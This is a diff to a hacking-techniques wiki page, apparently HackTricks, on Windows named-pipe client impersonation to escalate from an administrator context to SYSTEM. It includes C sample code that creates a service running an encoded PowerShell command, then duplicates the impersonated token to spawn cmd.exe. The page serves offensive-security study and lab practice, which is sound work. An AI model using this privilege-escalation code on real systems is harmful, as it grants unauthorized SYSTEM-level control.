@@ -4,13 +4,15 @@
 
 **Code flow:**
 
-1. Create a new Pipe
+1. Create a named-pipe server.
 2. Create and start a service that will connect to the created pipe and write something. The service code will execute this encoded PS code: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
-3. The service receive the data from the client in the pipe, call ImpersonateNamedPipeClient and waits for the service to finish
-4. Finally, uses the token obtained from the service to spawn a new _cmd.exe_
+3. After the service connects and writes, call `ImpersonateNamedPipeClient`, open the resulting thread token, and duplicate it as a primary token.<sup>[[1]](#references)</sup>
+4. Use that primary token to spawn `cmd.exe`.<sup>[[2]](#references)</sup>
+
+This route assumes the caller can create/start a service and possesses the privileges required by `CreateProcessWithTokenW` (normally `SeImpersonatePrivilege`). It is a high-integrity-to-SYSTEM technique, not a primitive available to an arbitrary low-privileged user.<sup>[[2]](#references)[[3]](#references)</sup>
 
 > [!WARNING]
-> If you don't have enough privileges the exploit may get stucked and never return.
+> If service creation fails, the sample does not signal the pipe thread and can wait indefinitely. Add error handling and timeouts before using it in a lab.
 
 ```c
 #include <windows.h>
@@ -36,7 +38,7 @@ int ServiceGo(void) {
 	// create Piper service
 	scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
 		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
-		"C:\\Windows\\\System32\\cmd.exe /rpowershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
+		"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
 		NULL, NULL, NULL, NULL, NULL);
 
 	if (scService == NULL) {
@@ -118,5 +120,11 @@ int main() {
 	return 0;
 }
 ```
+
+## References
+
+- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
+- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
+- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
 
 {{#include ../../banners/hacktricks-training.md}}
